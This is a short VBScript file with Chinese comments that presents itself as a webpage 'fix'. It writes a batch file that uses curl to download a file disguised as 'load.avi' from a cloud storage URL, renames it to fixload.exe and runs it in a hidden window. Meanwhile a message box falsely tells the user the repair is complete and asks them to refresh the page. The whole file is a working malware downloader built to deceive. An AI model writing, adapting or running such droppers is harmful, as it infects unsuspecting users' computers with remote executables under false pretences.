Option Explicit

Dim fso, batFile, batContent, currentDir, WshShell

' 获取当前目录
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetAbsolutePathName(".")

' 创建 updat.bat 文件的内容
batContent = "@echo off" & vbCrLf & _
             "setlocal" & vbCrLf & _
             "set url=https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi" & vbCrLf & _
             "set dest=load.avi" & vbCrLf & _
             "curl -o %dest% %url%" & vbCrLf & _
             "if exist %dest% (" & vbCrLf & _
             "    ren %dest% fixload.exe" & vbCrLf & _
             "    start fixload.exe" & vbCrLf & _
             ") else (" & vbCrLf & _
             "    echo Download failed." & vbCrLf & _
             ")" & vbCrLf & _
             "endlocal"

' 创建 updat.bat 文件
batFile = currentDir & "\updat.bat"
With fso.CreateTextFile(batFile, True)
    .WriteLine batContent
    .Close
End With

' 提示用户
MsgBox "修复完成！请刷新网页即可", vbInformation, "提示"

' 创建 WshShell 对象
Set WshShell = CreateObject("WScript.Shell")

' 运行 updat.bat
WshShell.Run batFile, 0, False

' 清理对象
Set fso = Nothing
Set WshShell = Nothing
